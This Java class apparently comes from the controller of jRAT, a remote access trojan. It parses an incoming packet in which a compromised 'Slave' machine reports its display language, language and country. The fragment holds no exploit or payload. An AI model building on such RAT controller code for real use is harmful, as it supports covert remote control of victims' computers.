package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.Slave;


public class Packet10InitDefaultLocale extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.setDisplayLanguage(slave.readLine());
		slave.setLanguage(slave.readLine());
		slave.setLongCountry(slave.readLine());

	}
}
